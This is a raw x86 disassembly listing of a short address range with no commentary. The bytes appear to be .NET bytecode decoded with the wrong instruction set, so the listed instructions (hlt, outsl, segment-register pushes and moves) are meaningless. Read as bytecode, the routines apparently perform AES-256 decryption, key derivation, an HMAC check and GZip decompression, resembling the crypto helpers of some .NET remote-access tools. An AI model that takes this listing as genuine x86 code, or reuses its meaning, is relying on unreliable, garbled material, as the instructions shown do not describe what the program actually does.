  405172:	00 00                	add    %al,(%eax)
  405174:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40517a:	28 f2                	sub    %dh,%dl
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  405184:	28 f2                	sub    %dh,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  40518e:	0a 28                	or     (%eax),%ch
  405190:	f4                   	hlt
  405191:	00 00                	add    %al,(%eax)
  405193:	0a 80 3c 00 00 04    	or     0x400003c(%eax),%al
  405199:	7e 3c                	jle    0x4051d7
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 7b                	add    $0x7b,%al
  40519f:	f5                   	cmc
  4051a0:	00 00                	add    %al,(%eax)
  4051a2:	0a 7e 3c             	or     0x3c(%esi),%bh
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	04 06                	add    $0x6,%al
  4051a9:	28 06                	sub    %al,(%esi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	06                   	push   %es
  4051ae:	7e 0b                	jle    0x4051bb
  4051b0:	00 00                	add    %al,(%eax)
  4051b2:	04 7e                	add    $0x7e,%al
  4051b4:	10 00                	adc    %al,(%eax)
  4051b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4051b9:	72 1f                	jb     0x4051da
  4051bb:	27                   	daa
  4051bc:	00 70 6f             	add    %dh,0x6f(%eax)
  4051bf:	4d                   	dec    %ebp
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	06                   	push   %es
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	48                   	dec    %eax
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	06                   	push   %es
  4051c8:	7e 39                	jle    0x405203
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	04 7e                	add    $0x7e,%al
  4051ce:	08 00                	or     %al,(%eax)
  4051d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4051d3:	0f 00 00             	sldt   (%eax)
  4051d6:	04 7e                	add    $0x7e,%al
  4051d8:	04 00                	add    $0x0,%al
  4051da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051dd:	f6 00 00             	testb  $0x0,(%eax)
  4051e0:	0a 28                	or     (%eax),%ch
  4051e2:	94                   	xchg   %eax,%esp
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	06                   	push   %es
  4051e6:	2a 00                	sub    (%eax),%al
  4051e8:	1b 30                	sbb    (%eax),%esi
  4051ea:	03 00                	add    (%eax),%eax
  4051ec:	53                   	push   %ebx
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 27                	add    %ah,(%edi)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	11 02                	adc    %eax,(%edx)
  4051f5:	28 1a                	sub    %bl,(%edx)
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	0a 03                	or     (%ebx),%al
  4051fb:	28 f7                	sub    %dh,%bh
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  405202:	72 4d                	jb     0x405251
  405204:	27                   	daa
  405205:	00 70 73             	add    %dh,0x73(%eax)
  405208:	f8                   	clc
  405209:	00 00                	add    %al,(%eax)
  40520b:	0a 7a 03             	or     0x3(%edx),%bh
  40520e:	7e 43                	jle    0x405253
  405210:	00 00                	add    %al,(%eax)
  405212:	04 20                	add    $0x20,%al
  405214:	50                   	push   %eax
  405215:	c3                   	ret
  405216:	00 00                	add    %al,(%eax)
  405218:	73 f9                	jae    0x405213
  40521a:	00 00                	add    %al,(%eax)
  40521c:	0a 0a                	or     (%edx),%cl
  40521e:	02 06                	add    (%esi),%al
  405220:	1f                   	pop    %ds
  405221:	20 6f fa             	and    %ch,-0x6(%edi)
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7d 41             	or     0x41(%ebp),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 02                	add    $0x2,%al
  40522d:	06                   	push   %es
  40522e:	1f                   	pop    %ds
  40522f:	40                   	inc    %eax
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	fa                   	cli
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 7d 42             	or     0x42(%ebp),%bh
  405237:	00 00                	add    %al,(%eax)
  405239:	04 de                	add    $0xde,%al
  40523b:	0a 06                	or     (%esi),%al
  40523d:	2c 06                	sub    $0x6,%al
  40523f:	06                   	push   %es
  405240:	6f                   	outsl  %ds:(%esi),(%dx)
  405241:	33 00                	xor    (%eax),%eax
  405243:	00 0a                	add    %cl,(%edx)
  405245:	dc 2a                	fsubrl (%edx)
  405247:	00 01                	add    %al,(%ecx)
  405249:	10 00                	adc    %al,(%eax)
  40524b:	00 02                	add    %al,(%edx)
  40524d:	00 2a                	add    %ch,(%edx)
  40524f:	00 1e                	add    %bl,(%esi)
  405251:	48                   	dec    %eax
  405252:	00 0a                	add    %cl,(%edx)
  405254:	00 00                	add    %al,(%eax)
  405256:	00 00                	add    %al,(%eax)
  405258:	1b 30                	sbb    (%eax),%esi
  40525a:	05 00 00 01 00       	add    $0x10000,%eax
  40525f:	00 28                	add    %ch,(%eax)
  405261:	00 00                	add    %al,(%eax)
  405263:	11 03                	adc    %eax,(%ebx)
  405265:	2d 0b 72 95 27       	sub    $0x2795720b,%eax
  40526a:	00 70 73             	add    %dh,0x73(%eax)
  40526d:	fc                   	cld
  40526e:	00 00                	add    %al,(%eax)
  405270:	0a 7a 73             	or     0x73(%edx),%bh
  405273:	79 00                	jns    0x405275
  405275:	00 0a                	add    %cl,(%edx)
  405277:	0a 06                	or     (%esi),%al
  405279:	1f                   	pop    %ds
  40527a:	20 6a 6f             	and    %ch,0x6f(%edx)
  40527d:	4e                   	dec    %esi
  40527e:	00 00                	add    %al,(%eax)
  405280:	0a 73 fd             	or     -0x3(%ebx),%dh
  405283:	00 00                	add    %al,(%eax)
  405285:	0a 0b                	or     (%ebx),%cl
  405287:	07                   	pop    %es
  405288:	20 00                	and    %al,(%eax)
  40528a:	01 00                	add    %eax,(%eax)
  40528c:	00 6f fe             	add    %ch,-0x2(%edi)
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 07                	or     (%edi),%al
  405293:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405299:	ff 00                	incl   (%eax)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	07                   	pop    %es
  40529e:	17                   	pop    %ss
  40529f:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a0:	00 01                	add    %al,(%ecx)
  4052a2:	00 0a                	add    %cl,(%edx)
  4052a4:	07                   	pop    %es
  4052a5:	18 6f 01             	sbb    %ch,0x1(%edi)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	0a 07                	or     (%edi),%al
  4052ac:	02 7b 41             	add    0x41(%ebx),%bh
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	04 6f                	add    $0x6f,%al
  4052b3:	02 01                	add    (%ecx),%al
  4052b5:	00 0a                	add    %cl,(%edx)
  4052b7:	07                   	pop    %es
  4052b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b9:	03 01                	add    (%ecx),%eax
  4052bb:	00 0a                	add    %cl,(%edx)
  4052bd:	06                   	push   %es
  4052be:	07                   	pop    %es
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	04 01                	add    $0x1,%al
  4052c2:	00 0a                	add    %cl,(%edx)
  4052c4:	17                   	pop    %ss
  4052c5:	73 05                	jae    0x4052cc
  4052c7:	01 00                	add    %eax,(%eax)
  4052c9:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052cc:	07                   	pop    %es
  4052cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ce:	06                   	push   %es
  4052cf:	01 00                	add    %eax,(%eax)
  4052d1:	0a 16                	or     (%esi),%dl
  4052d3:	07                   	pop    %es
  4052d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d5:	06                   	push   %es
  4052d6:	01 00                	add    %eax,(%eax)
  4052d8:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052de:	00 0a                	add    %cl,(%edx)
  4052e0:	08 03                	or     %al,(%ebx)
  4052e2:	16                   	push   %ss
  4052e3:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052e9:	00 0a                	add    %cl,(%edx)
  4052eb:	08 6f 07             	or     %ch,0x7(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 02                	or     (%edx),%al
  4052f2:	7b 42                	jnp    0x405336
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	04 73                	add    $0x73,%al
  4052f8:	08 01                	or     %al,(%ecx)
  4052fa:	00 0a                	add    %cl,(%edx)
  4052fc:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  405301:	01 00                	add    %eax,(%eax)
  405303:	0a 1f                	or     (%edi),%bl
  405305:	20 06                	and    %al,(%esi)
  405307:	6f                   	outsl  %ds:(%esi),(%dx)
  405308:	09 01                	or     %eax,(%ecx)
  40530a:	00 0a                	add    %cl,(%edx)
  40530c:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40530f:	20 59 6f             	and    %bl,0x6f(%ecx)
  405312:	0a 01                	or     (%ecx),%al
  405314:	00 0a                	add    %cl,(%edx)
  405316:	13 04 06             	adc    (%esi,%eax,1),%eax
  405319:	16                   	push   %ss
  40531a:	6a 6f                	push   $0x6f
  40531c:	4e                   	dec    %esi
  40531d:	00 00                	add    %al,(%eax)
  40531f:	0a 06                	or     (%esi),%al
  405321:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405324:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405327:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40532e:	1e                   	push   %ds
  40532f:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  405332:	09 6f 33             	or     %ebp,0x33(%edi)
  405335:	00 00                	add    %al,(%eax)
  405337:	0a dc                	or     %ah,%bl
  405339:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40533c:	08 6f 33             	or     %ch,0x33(%edi)
  40533f:	00 00                	add    %al,(%eax)
  405341:	0a dc                	or     %ah,%bl
  405343:	07                   	pop    %es
  405344:	2c 06                	sub    $0x6,%al
  405346:	07                   	pop    %es
  405347:	6f                   	outsl  %ds:(%esi),(%dx)
  405348:	33 00                	xor    (%eax),%eax
  40534a:	00 0a                	add    %cl,(%edx)
  40534c:	dc 06                	faddl  (%esi)
  40534e:	6f                   	outsl  %ds:(%esi),(%dx)
  40534f:	09 01                	or     %eax,(%ecx)
  405351:	00 0a                	add    %cl,(%edx)
  405353:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405359:	06                   	push   %es
  40535a:	06                   	push   %es
  40535b:	6f                   	outsl  %ds:(%esi),(%dx)
  40535c:	33 00                	xor    (%eax),%eax
  40535e:	00 0a                	add    %cl,(%edx)
  405360:	dc 11                	fcoml  (%ecx)
  405362:	05 2a 01 34 00       	add    $0x34012a,%eax
  405367:	00 02                	add    %al,(%edx)
  405369:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40536f:	0a 00                	or     (%eax),%al
  405371:	00 00                	add    %al,(%eax)
  405373:	00 02                	add    %al,(%edx)
  405375:	00 67 00             	add    %ah,0x0(%edi)
  405378:	6e                   	outsb  %ds:(%esi),(%dx)
  405379:	d5 00                	aad    $0x0
  40537b:	0a 00                	or     (%eax),%al
  40537d:	00 00                	add    %al,(%eax)
  40537f:	00 02                	add    %al,(%edx)
  405381:	00 23                	add    %ah,(%ebx)
  405383:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	02 00                	add    (%eax),%al
  40538e:	14 00                	adc    $0x0,%al
  405390:	df f3                	fcomip %st(3),%st
  405392:	00 0a                	add    %cl,(%edx)
  405394:	00 00                	add    %al,(%eax)
  405396:	00 00                	add    %al,(%eax)
  405398:	1b 30                	sbb    (%eax),%esi
  40539a:	05 00 37 01 00       	add    $0x13700,%eax
  40539f:	00 29                	add    %ch,(%ecx)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	11 03                	adc    %eax,(%ebx)
  4053a5:	2d 0b 72 95 27       	sub    $0x2795720b,%eax
  4053aa:	00 70 73             	add    %dh,0x73(%eax)
  4053ad:	fc                   	cld
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 7a 03             	or     0x3(%edx),%bh
  4053b3:	73 4d                	jae    0x405402
  4053b5:	00 00                	add    %al,(%eax)
  4053b7:	0a 0a                	or     (%edx),%cl
  4053b9:	73 fd                	jae    0x4053b8
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 0b                	or     (%ebx),%cl
  4053bf:	07                   	pop    %es
  4053c0:	20 00                	and    %al,(%eax)
  4053c2:	01 00                	add    %eax,(%eax)
  4053c4:	00 6f fe             	add    %ch,-0x2(%edi)
  4053c7:	00 00                	add    %al,(%eax)
  4053c9:	0a 07                	or     (%edi),%al
  4053cb:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053d1:	ff 00                	incl   (%eax)
  4053d3:	00 0a                	add    %cl,(%edx)
  4053d5:	07                   	pop    %es
  4053d6:	17                   	pop    %ss
  4053d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	00 0a                	add    %cl,(%edx)
  4053dc:	07                   	pop    %es
  4053dd:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053e0:	01 00                	add    %eax,(%eax)
  4053e2:	0a 07                	or     (%edi),%al
  4053e4:	02 7b 41             	add    0x41(%ebx),%bh
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	04 6f                	add    $0x6f,%al
  4053eb:	02 01                	add    (%ecx),%al
  4053ed:	00 0a                	add    %cl,(%edx)
  4053ef:	02 7b 42             	add    0x42(%ebx),%bh
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	04 73                	add    $0x73,%al
  4053f6:	08 01                	or     %al,(%ecx)
  4053f8:	00 0a                	add    %cl,(%edx)
  4053fa:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053ff:	01 00                	add    %eax,(%eax)
  405401:	0a 1f                	or     (%edi),%bl
  405403:	20 06                	and    %al,(%esi)
  405405:	6f                   	outsl  %ds:(%esi),(%dx)
  405406:	09 01                	or     %eax,(%ecx)
  405408:	00 0a                	add    %cl,(%edx)
  40540a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40540d:	20 59 6f             	and    %bl,0x6f(%ecx)
  405410:	0a 01                	or     (%ecx),%al
  405412:	00 0a                	add    %cl,(%edx)
  405414:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405417:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40541d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405423:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  405429:	00 00                	add    %al,(%eax)
  40542b:	0a 26                	or     (%esi),%ah
  40542d:	02 11                	add    (%ecx),%dl
  40542f:	04 11                	add    $0x11,%al
  405431:	05 28 9c 00 00       	add    $0x9c28,%eax
  405436:	06                   	push   %es
  405437:	2d 0b 72 c3 27       	sub    $0x27c3720b,%eax
  40543c:	00 70 73             	add    %dh,0x73(%eax)
  40543f:	0b 01                	or     (%ecx),%eax
  405441:	00 0a                	add    %cl,(%edx)
  405443:	7a de                	jp     0x405423
  405445:	0a 09                	or     (%ecx),%cl
  405447:	2c 06                	sub    $0x6,%al
  405449:	09 6f 33             	or     %ebp,0x33(%edi)
  40544c:	00 00                	add    %al,(%eax)
  40544e:	0a dc                	or     %ah,%bl
  405450:	1f                   	pop    %ds
  405451:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  405457:	0c 06                	or     $0x6,%al
  405459:	08 16                	or     %dl,(%esi)
  40545b:	1f                   	pop    %ds
  40545c:	10 6f 45             	adc    %ch,0x45(%edi)
  40545f:	00 00                	add    %al,(%eax)
  405461:	0a 26                	or     (%esi),%ah
  405463:	07                   	pop    %es
  405464:	08 6f 0c             	or     %ch,0xc(%edi)
  405467:	01 00                	add    %eax,(%eax)
  405469:	0a 06                	or     (%esi),%al
  40546b:	07                   	pop    %es
  40546c:	6f                   	outsl  %ds:(%esi),(%dx)
  40546d:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405472:	73 05                	jae    0x405479
  405474:	01 00                	add    %eax,(%eax)
  405476:	0a 13                	or     (%ebx),%dl
  405478:	06                   	push   %es
  405479:	06                   	push   %es
  40547a:	6f                   	outsl  %ds:(%esi),(%dx)
  40547b:	75 00                	jne    0x40547d
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	1f                   	pop    %ds
  405480:	10 6a 59             	adc    %ch,0x59(%edx)
  405483:	17                   	pop    %ss
  405484:	6a 58                	push   $0x58
  405486:	d4 8d                	aam    $0x8d
  405488:	44                   	inc    %esp
  405489:	00 00                	add    %al,(%eax)
  40548b:	01 13                	add    %edx,(%ebx)
  40548d:	07                   	pop    %es
  40548e:	11 06                	adc    %eax,(%esi)
  405490:	11 07                	adc    %eax,(%edi)
  405492:	16                   	push   %ss
  405493:	11 07                	adc    %eax,(%edi)
  405495:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405498:	45                   	inc    %ebp
  405499:	00 00                	add    %al,(%eax)
  40549b:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4054a1:	13 08                	adc    (%eax),%ecx
  4054a3:	11 07                	adc    %eax,(%edi)
  4054a5:	16                   	push   %ss
  4054a6:	11 08                	adc    %ecx,(%eax)
  4054a8:	16                   	push   %ss
  4054a9:	11 08                	adc    %ecx,(%eax)
  4054ab:	8e 69 28             	mov    0x28(%ecx),%gs
  4054ae:	0e                   	push   %cs
  4054af:	01 00                	add    %eax,(%eax)
  4054b1:	0a 11                	or     (%ecx),%dl
  4054b3:	08 13                	or     %dl,(%ebx)
  4054b5:	09 de                	or     %ebx,%esi
  4054b7:	20 11                	and    %dl,(%ecx)
  4054b9:	06                   	push   %es
  4054ba:	2c 07                	sub    $0x7,%al
  4054bc:	11 06                	adc    %eax,(%esi)
  4054be:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bf:	33 00                	xor    (%eax),%eax
  4054c1:	00 0a                	add    %cl,(%edx)
  4054c3:	dc 07                	faddl  (%edi)
  4054c5:	2c 06                	sub    $0x6,%al
  4054c7:	07                   	pop    %es
  4054c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c9:	33 00                	xor    (%eax),%eax
  4054cb:	00 0a                	add    %cl,(%edx)
  4054cd:	dc 06                	faddl  (%esi)
  4054cf:	2c 06                	sub    $0x6,%al
  4054d1:	06                   	push   %es
  4054d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d3:	33 00                	xor    (%eax),%eax
  4054d5:	00 0a                	add    %cl,(%edx)
  4054d7:	dc 11                	fcoml  (%ecx)
  4054d9:	09 2a                	or     %ebp,(%edx)
  4054db:	00 41 64             	add    %al,0x64(%ecx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	02 00                	add    (%eax),%al
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	57                   	push   %edi
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 4b 00             	add    %cl,0x0(%ebx)
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 02                	add    %al,(%edx)
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 d5                	add    %dl,%ch
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 3f                	add    %bh,(%edi)
  405501:	00 00                	add    %al,(%eax)
  405503:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405506:	00 00                	add    %al,(%eax)
  405508:	0c 00                	or     $0x0,%al
  40550a:	00 00                	add    %al,(%eax)
  40550c:	00 00                	add    %al,(%eax)
  40550e:	00 00                	add    %al,(%eax)
  405510:	02 00                	add    (%eax),%al
  405512:	00 00                	add    %al,(%eax)
  405514:	1b 00                	sbb    (%eax),%eax
  405516:	00 00                	add    %al,(%eax)
  405518:	05 01 00 00 20       	add    $0x20000001,%eax
  40551d:	01 00                	add    %eax,(%eax)
  40551f:	00 0a                	add    %cl,(%edx)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 00                	add    %al,(%eax)
  405527:	00 02                	add    %al,(%edx)
  405529:	00 00                	add    %al,(%eax)
  40552b:	00 15 00 00 00 15    	add    %dl,0x15000000
  405531:	01 00                	add    %eax,(%eax)
  405533:	00 2a                	add    %ch,(%edx)
  405535:	01 00                	add    %eax,(%eax)
  405537:	00 0a                	add    %cl,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 00                	add    %al,(%eax)
  40553f:	00 13                	add    %dl,(%ebx)
  405541:	30 03                	xor    %al,(%ebx)
  405543:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	2a 00                	sub    (%eax),%al
  40554a:	00 11                	add    %dl,(%ecx)
  40554c:	17                   	pop    %ss
  40554d:	0a 16                	or     (%esi),%dl
  40554f:	0b 2b                	or     (%ebx),%ebp
  405551:	0e                   	push   %cs
  405552:	03 07                	add    (%edi),%eax
  405554:	91                   	xchg   %eax,%ecx
  405555:	04 07                	add    $0x7,%al
  405557:	91                   	xchg   %eax,%ecx
  405558:	2e 02 16             	add    %cs:(%esi),%dl
  40555b:	0a 07                	or     (%edi),%al
  40555d:	17                   	pop    %ss
  40555e:	58                   	pop    %eax
  40555f:	0b 07                	or     (%edi),%eax
  405561:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  405567:	2a 1b                	sub    (%ebx),%bl
  405569:	30 03                	xor    %al,(%ebx)
  40556b:	00 65 00             	add    %ah,0x0(%ebp)
  40556e:	00 00                	add    %al,(%eax)
  405570:	2b 00                	sub    (%eax),%eax
  405572:	00 11                	add    %dl,(%ecx)
  405574:	28 1b                	sub    %bl,(%ebx)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 02                	or     (%edx),%al
  40557a:	6f                   	outsl  %ds:(%esi),(%dx)
  40557b:	21 00                	and    %eax,(%eax)
  40557d:	00 0a                	add    %cl,(%edx)
  40557f:	0a 73 0f             	or     0xf(%ebx),%dh
  405582:	01 00                	add    %eax,(%eax)
  405584:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405587:	06                   	push   %es
  405588:	6f                   	outsl  %ds:(%esi),(%dx)
  405589:	c5 00                	lds    (%eax),%eax
  40558b:	00 0a                	add    %cl,(%edx)
  40558d:	0a de                	or     %dh,%bl
  40558f:	0a 08                	or     (%eax),%cl
  405591:	2c 06                	sub    $0x6,%al
  405593:	08 6f 33             	or     %ch,0x33(%edi)
  405596:	00 00                	add    %al,(%eax)
  405598:	0a dc                	or     %ah,%bl
  40559a:	73 53                	jae    0x4055ef
  40559c:	00 00                	add    %al,(%eax)
  40559e:	0a 0b                	or     (%ebx),%cl
  4055a0:	06                   	push   %es
  4055a1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055a6:	1f                   	pop    %ds
  4055a7:	09 11                	or     %edx,(%ecx)
  4055a9:	04 91                	add    $0x91,%al
  4055ab:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055b1:	19 28                	sbb    %ebp,(%eax)
  4055b3:	00 70 28             	add    %dh,0x28(%eax)
  4055b6:	c6 00 00             	movb   $0x0,(%eax)
  4055b9:	0a 6f 55             	or     0x55(%edi),%ch
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	0a 26                	or     (%esi),%ah
  4055c0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055c3:	58                   	pop    %eax
  4055c4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055c7:	04 09                	add    $0x9,%al
  4055c9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055cc:	da 07                	fiaddl (%edi)
  4055ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4055cf:	38 00                	cmp    %al,(%eax)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055d8:	2a 00                	sub    (%eax),%al
  4055da:	00 00                	add    %al,(%eax)
  4055dc:	01 10                	add    %edx,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	02 00                	add    (%eax),%al
  4055e2:	12 00                	adc    (%eax),%al
  4055e4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055e7:	0a 00                	or     (%eax),%al
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	00 1b                	add    %bl,(%ebx)
  4055ed:	30 02                	xor    %al,(%edx)
  4055ef:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	2c 00                	sub    $0x0,%al
  4055f6:	00 11                	add    %dl,(%ecx)
  4055f8:	73 0f                	jae    0x405609
  4055fa:	01 00                	add    %eax,(%eax)
  4055fc:	0a 0a                	or     (%edx),%cl
  4055fe:	06                   	push   %es
  4055ff:	02 6f c5             	add    -0x3b(%edi),%ch
  405602:	00 00                	add    %al,(%eax)
  405604:	0a 0b                	or     (%ebx),%cl
  405606:	de 0a                	fimuls (%edx)
  405608:	06                   	push   %es
  405609:	2c 06                	sub    $0x6,%al
  40560b:	06                   	push   %es
  40560c:	6f                   	outsl  %ds:(%esi),(%dx)
  40560d:	33 00                	xor    (%eax),%eax
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	dc 07                	faddl  (%edi)
  405613:	2a 01                	sub    (%ecx),%al
  405615:	10 00                	adc    %al,(%eax)
  405617:	00 02                	add    %al,(%edx)
  405619:	00 06                	add    %al,(%esi)
  40561b:	00 0a                	add    %cl,(%edx)
  40561d:	10 00                	adc    %al,(%eax)
  40561f:	0a 00                	or     (%eax),%al
  405621:	00 00                	add    %al,(%eax)
  405623:	00 1b                	add    %bl,(%ebx)
  405625:	30 04 00             	xor    %al,(%eax,%eax,1)
  405628:	58                   	pop    %eax
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405631:	73 4d                	jae    0x405680
  405633:	00 00                	add    %al,(%eax)
  405635:	0a 0a                	or     (%edx),%cl
  405637:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  40563d:	0b 06                	or     (%esi),%eax
  40563f:	07                   	pop    %es
  405640:	16                   	push   %ss
  405641:	1a 6f 45             	sbb    0x45(%edi),%ch
  405644:	00 00                	add    %al,(%eax)
  405646:	0a 26                	or     (%esi),%ah
  405648:	07                   	pop    %es
  405649:	16                   	push   %ss
  40564a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40564e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405651:	16                   	push   %ss
  405652:	73 10                	jae    0x405664
  405654:	01 00                	add    %eax,(%eax)
  405656:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  40565c:	00 01                	add    %al,(%ecx)
  40565e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405661:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405664:	08 6f 45             	or     %ch,0x45(%edi)
  405667:	00 00                	add    %al,(%eax)
  405669:	0a 26                	or     (%esi),%ah
  40566b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40566e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405673:	06                   	push   %es
  405674:	09 6f 33             	or     %ebp,0x33(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a dc                	or     %ah,%bl
  40567b:	06                   	push   %es
  40567c:	2c 06                	sub    $0x6,%al
  40567e:	06                   	push   %es
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 0a                	add    %cl,(%edx)
  405684:	dc 11                	fcoml  (%ecx)
  405686:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40568b:	00 02                	add    %al,(%edx)
  40568d:	00 28                	add    %ch,(%eax)
  40568f:	00 19                	add    %bl,(%ecx)
  405691:	41                   	inc    %ecx
  405692:	00 0a                	add    %cl,(%edx)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	02 00                	add    (%eax),%al
  40569a:	07                   	pop    %es
  40569b:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  40569f:	0a 00                	or     (%eax),%al
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 1b                	add    %bl,(%ebx)
  4056a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056a8:	52                   	push   %edx
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 2e                	add    %ch,(%esi)
  4056ad:	00 00                	add    %al,(%eax)
  4056af:	11 73 79             	adc    %esi,0x79(%ebx)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0a 0a                	or     (%edx),%cl
  4056b6:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  4056bc:	00 0a                	add    %cl,(%edx)
  4056be:	0b 06                	or     (%esi),%eax
  4056c0:	07                   	pop    %es
  4056c1:	16                   	push   %ss
  4056c2:	1a 6f 4c             	sbb    0x4c(%edi),%ch
